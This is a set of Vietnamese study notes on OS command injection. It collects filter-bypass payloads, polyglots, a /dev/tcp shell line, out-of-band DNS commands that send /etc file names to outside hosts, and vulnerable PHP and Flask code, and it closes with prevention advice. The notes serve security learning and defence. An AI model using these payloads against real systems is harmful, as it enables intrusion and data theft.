# Blackbox testing 

## Bypass space

Linux only

dùng `<`

- `cat</etc/passwd`

dùng {,}

- `{cat,/etc/passwd}`

dùng $IFS 

- `cat$IFS/etc/passwd`

dùng ${IFS} kết hợp với các toán tử logic

- `echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd`

sử dụng gán toán tử kết hợp với mã hóa kí tự space thành `\x20` trong hex

- `X=$(uname\x20-a)&&$x` hoặc `X=$'uname\x20-a'&&$X`

thiết lập 1 kết nối shell đến một cổng mở bất kì

- `sh</dev/tcp/127.0.0.1/4242`

> ${IFS} là biến môi trường được sử dụng để xác định ký tự phân tách được sử dụng để tách các phần của một lệnh hoặc đối số. Giá trị mặc định của biến này là một khoảng trắng, tab hoặc ký tự xuống dòng. Tuy nhiên nó có thể được đặt thành bất kỳ ký tự nào khác.

thực hiện command bằng bash script mà không cần đến `space,$,{}`

- IFS=,;\`cat<<<uname,-a\`

có thể sử dụng tab thay thế space trong một số trường hợp

- `cat%09/etc/passwd`

Windows only

```
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

## Bypass with a line return

- `something%0Acat%20/etc/passwd`

- `cat > /tmp/hi << EOF%0ahello%0aEOF`

> Ở đây cú pháp `<<EOF` là một dạng `here document` trong shell scripting, cho phép người dùng nhập nội dung trực tiếp từ dòng lệnh. Phần kết thúc của chuỗi này chính là kí tự `EOF`.

## Bypass with backslash newline

```
cat /et\
c/pas\
swd
```

URL encoded sẽ là: `cat%20/et%5C%0Ac/pa%5C%0Asswd`

## Bypass characters filter via hex encoding

 Ta có thể sử dụng lệnh echo -e để trong cú pháp truyền vào có thể sử dụng các loại mã hóa như `\n` là xuống dòng, `\t` là tab.

```shell
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" (/etc/passwd)

cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

```

Ta cũng có thế sử dụng hexdump kết hợp xxd:

```shell
#Cach 1
    xxd -r -p <<< 2f6574632f706173737764 (/etc/passwd)
    cat `xxd -r -p <<< 2f6574632f706173737764` 
#Cach 2
    xxd -r -ps <(echo 2f6574632f706173737764) (/etc/passwd)
    cat `xxd -r -ps <(echo 2f6574632f706173737764)`

# -r la reverse tu kieu hex ve dang ASCII 
# -p la input dua vao duoi dang hexdump khong co bat ky ki tu xuong dong hay ki tu ACSII
# <() o day thay the cho viec su dung output cua command nhu mot tap tin
# -ps chuyen input thanh hexa khong co them mot dinh dang bo sung nao
```

## Bypass character filter

Nếu ta bị filter mất dấu `/` thì ta có thể sử dụng một số cách sau: 

```shell
# Cach 1
    echo ${HOME:0:1}
    cat `echo ${HOME:0:1}etc${HOME:0:1}passwd` (/etc/passwd)

# Explain: Command ${HOME:0:1} sử dụng lệnh mở rộng của bash shell. 
#   - HOME chính là biến môi trường của Linux
#   - 0 đánh dấu điểm bắt đầu lấy của string mới
#   - 1 là số kí tự lấy bắt đầu từ điểm đã đánh dấu
# Ở đây biến HOME thường chứa đường dẫn home tạo sẵn của người dùng. Thông thường sẽ là /home/user. Vậy nếu command trên được thực thi thì nó sẽ lấy được kí tự / xuất hiện đầu tiên trong đường dẫn.

# Cach 2
    echo . | tr '!-0' '"-1'
    tr '!-0' '"-1' <<< .
    cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

# Explain: tr command có tác dụng thay thế hoặc xóa kí tự. Nếu mặc định sau tr mà không có option thì nó sẽ là thay đổi kí tự hoặc tập kí tự. Ở cách trên họ đã chuyển tất cả kí tự trong bảng ASCII từ khoảng [!-0] thành ["-1]. Tăng thêm 1. Vì vậy khi echo ra dấu . và chuyển output đó vào câu lệnh tr sau thì nó sẽ được chuyển thành /.
```

## Bypass Blacklisted words

### Bypass with single quote

```shell
w'h'o'am'i
```

### Bypass with double quote

```shell
w"h"o"am"i
```

### Bypass with backslash(\\) and slash(/)

```shell
# Cach 1
    w\h\o\a\m\i

# Cach 2
    /\bin//////b\a\s\h
```

### Bypass with $@

```shell
# Cach 1
    who$@ami
# Note: Trong Linux, $@ là một biến đặc biệt trong các shell script. Biến này đại diện cho tất cả các tham số được truyền vào script khi nó được gọi. Nó chứa danh sách các tham số hoặc đối số được cung cấp cho script khi thực thi. $0 thường sẽ là tên chương trình thực thi hoặc môi trường thực thi của lệnh nên nếu muốn đổi @ thành số sẽ phải sử dụng từ 1 trở đi.
    echo $0
    -> /usr/bin/zsh

# Cach 2
    whoami|$0 
    # lỗi
```

### Bypass with $()

`$()` cho phép người dùng thực thi command trong cặp dấu ngoặc

```shell
# Cach 1
    who$()ami

# Cach 2
    who$(echo am)i

# Cach 3
    who`echo am`i
```

### Bypass with variable expansion

Sau khi thêm rất nhiều kí tự chen giữa command ban đầu. Ta có thể sử dụng cấu trúc `${var//pattern/replacement}` để thay thế tất cả các lần xuất hiện của `pattern` trong giá trị của biến `var` bằng `replacement`.

```shell

test=/ehhh/hmtc/pahhh/hmsswd

# Cach 1
    cat ${test//hhh\/hm/}
# Cach 2
    cat ${test//hh??hm/}

# Explain: Thay thế tất cả các kí tự hhh/hm thành rỗng để trở về chuỗi /etc/passwd ban đầu.

```

### Bypass with wildcards

```shell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc

```

- Đọc lại wildcard [link](https://medium.com/t-blog/linux-ph%E1%BA%A7n-7-k%C3%AD-t%E1%BB%B1-%C4%91%E1%BA%A1i-di%E1%BB%87n-wildcards-92a7875f4c9b)


> g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}

## Polyglot command injection

```shell
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## Backgrounding long running commands

Sử dụng lệnh nohup để giữ process được chạy mặc dù parents process đã thoát.

```shell
nohup sleep 120 > /dev/null &
```

## Blind OS Command injection

### Timebased

```shell
&& sleep 10 

&& ping -c 10 127.0.0.1 &
```

### Sử dụng Out-Of-Band (OAST)

OAST là phương pháp tương tác với hệ thống mạng bên ngoài (thông thường là hệ thống của Hacker). Hacker sẽ tìm cách Inject các lệnh yêu cầu máy chủ mục tiêu bắn các tín hiệu sang máy chủ của Hacker để xác định. Bạn có thể sử dụng lệnh `ping`, `nslookup`, `curl`, `wget`, `telnet`, `mail`, `ftp` để tạo `ICMP`, `FTP`, `HTTP` Request.


```shell
for i in $(ls /etc) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

# Explain: Lệnh host trên tìm kiếm thông tin DNS cho các tên miền đã được cung cấp.

$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)

# Explain: 
# - Lệnh wget -h đầu tiên mở bảng hướng dẫn và gửi output thì input cho câu lệnh sau
# - Lệnh head -n1 lấy dòng đầu tiên của bảng hướng dẫn wget và gửi output thành input cho câu lệnh tiếp theo
# - Lệnh sed 's/[ ,]/-/g' với flag (/g) sẽ thay thế tất cả các kí tự khoảng trắng và dấu phẩy thành dấu gạch ngang trong input.
# - Lệnh tr -d sẽ xóa hết tất cả dấu chấm trong input.  

# Tóm lại, chuỗi lệnh này sẽ lấy thông tin từ trợ giúp của wget, sau đó xử lý dòng đầu tiên bằng cách thay thế khoảng trắng và dấu phẩy thành dấu gạch ngang, sau đó loại bỏ tất cả các dấu chấm từ kết quả cuối cùng.

```

- Kỹ thuật OAST thường bắt đầu bằng việc encode dữ liệu đánh cắp thành dạng có thể truyền tải qua DNS. Sau đó, dữ liệu này được nhúng vào các truy vấn DNS và gửi đến máy chủ DNS của Hacker. Máy chủ này sẽ thực hiện việc ghép chuỗi dữ liệu từ các truy vấn.
- Dữ liệu có thể được nhúng vào nhiều phần của truy vấn DNS, chẳng hạn như tên miền (subdomain) hoặc trong phần dữ liệu của truy vấn (bản ghi TXT). 

## Những tham số hay có lỗi

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

## Tìm kiếm lỗ hổng OS Command injection bằng Burp Suite Active Scan

- Đọc thêm tại [link](https://battle.cookiearena.org/skills-path/os-command-injection/tim-bug-tu-dong-voi-burp-suite).

# Whitebox testing

## PHP Example

Một ứng dụng web được viết bằng PHP có thể sử dụng các hàm như `exec`, `system`, `shell_exec`, `passthru` hoặc `popen` để thực thi các lệnh trực tiếp trên máy chủ phía sau. Mỗi hàm này đều có một tính năng nhất nhất định. Dưới đây là đoạn mã PHP bị lỗ hổng `OS Command Injection`:

- `passthru` sử dụng giống `exec`.
- `popen` thì có chỉ có 2 chức năng đó là đọc và ghi file.

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Đoạn code trên có chức năng lấy tên file người dùng nhập vào để làm tên tạo một file pdf trong đường dẫn `/tmp/`. Tuy nhiên ở đoạn code trên không có filter đầu vào nên ta có một số cách để chèn Command Injection.

| Filename                     	| Full command                                	|
|------------------------------	|---------------------------------------------	|
| a.pdf; cat /etc/passwd; ls a 	| touch /tmp/a.pdf; cat /etc/passwd; ls a.pdf 	|
| a && cat /etc/passwd;        	| touch /tmp/a; cat /etc/passwd;a.pdf         	|
| a \|\| cat /etc/passwd;      	| touch /tmp/a \|\| cat /etc/passwd;          	|
| $(echo whoami)               	| touch /tmp/$(echo whoami).pdf               	|

Nếu đoạn code được thêm cặp dấu nháy đơn:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch '/tmp/" . $_GET['filename'] . ".pdf'");
}
?>
```

| Filename                         	| Full command                                 	|
|----------------------------------	|----------------------------------------------	|
| a.pdf’; cat /etc/passwd; echo ‘1 	| touch ‘a.pdf’; cat /etc/passwd; echo ‘1.pdf’ 	|

[Một số hàm thực thi lệnh hệ thống trong PHP](https://www.php.net/manual/en/ref.exec.php).

## Golang Example

```golang
func System(shell_command string) (string, error) {
    cmd := exec.Command("/bin/sh", "-c", shell_command)
    output, err := cmd.Output()
    if err != nil {
        return "", err
    }
    return string(output), nil
}
```

## Python Example

Đoạn mã sau của một ứng dụng web Flask được viết bằng Python, nó thực hiện lệnh `nslookup` để trả về tên máy chủ của hostname mà người dùng nhập vào.

```python
@app.route("/dns")
def page():
    hostname = request.values.get('hostname')
    cmd = 'nslookup ' + hostname

    return subprocess.check_output(cmd, shell=True)
```

Do biến hostname chỉ đơn giản được thêm vào lệnh và thực thi trên một subshell với `shell=True`. Kẻ tấn công có thể inject thêm một lệnh khác bằng cách sử dụng dấu chấm phẩy; trong tham số GET của file_path. Payload để đọc file /etc/passwd trong trường hợp này là `/dns?hostname=localhost; cat /etc/passwd`

## Static code analysis

## Sử dụng Semgrep để tìm bug

# Ngăn chặn tổng quan

Nhìn chung, tất cả những lỗ hổng xếp trong nhóm Injection của OWASP luôn có cách ngăn chặn như này:
- Không bao giờ tin tưởng vào dữ liệu đầu vào từ người dùng mà không kiểm tra (validate) và làm sạch (clean) nó trước.
- Sử dụng các hàm hoặc thư viện đã được kiểm tra và an toàn để chạy lệnh hệ thống thay vì tự phát triển
- Phân quyền cho ứng dụng để nếu có xuất hiện lỗ hổng thì nó cũng chỉ chạy được các lệnh hệ thống giới hạn, không thể vượt quyền chạy các lệnh nguy hiểm
- Tuân thủ các nguyên tắc lập trình an toàn khi phát triển phần mềm

Tuy nhiên, cách hiệu quả nhất để ngăn chặn lỗ hổng OS Command Injection là không bao giờ tự viết code các đoạn mã thực thi lệnh của hệ điều hành từ trong ứng dụng. Luôn có các cách thay thế để triển khai chức năng cần thiết bằng cách sử dụng các API an toàn hơn. Ví dụ, nếu muốn sử dụng lệnh curl của hệ thống bạn có thể sử dụng lib-curl hoặc các thư viện tạo HTTP Request có sẵn của mã nguồn mà bạn đang lập trình.

Nếu ứng dụng của bạn bắt buộc phải sử dụng lệnh hệ điều hành mới giải quyết được. Thì việc kiểm tra dữ liệu đầu vào một cách nghiêm ngặt là điều bắt buộc. Các cách kiểm tra có thể triển khai:
- Loại bỏ các ký tự đặc biệt (blacklist) có khả năng kích hoạt một câu lệnh hệ thống như `$`, `&&`, `||` , `;`, `back tick`, `>`, `<`.
- Loại bỏ các ký tự có khả năng tạo ra khoảng trắng trong input như dấu cách, dấu tab, dấu enter, các ký tự xuống dòng khác.
- Nếu là chuỗi thì chỉ chấp nhận các ký tự từ a-z chữ thường hoặc chữ Hoa và số từ 0-9.
- Kiểm tra kiểu dữ liệu, nếu là số chỉ cho nhập số, nếu là IP thì nó phải là một địa chỉ IP hợp lệ. Tương tự với các kiểu dữ liệu ngày tháng, URL, Hostname, Domain,..
- Sử dụng `Escape String`. Ví dụ kí tự `&` khi được đưa vào sẽ bị đổi thành `\&` . Ký tự `\` phía trước các ký tự đặc biệt sẽ biến nó thành dạng không gây hại, để ngăn chặn nó từ việc được thực thi như một lệnh.

















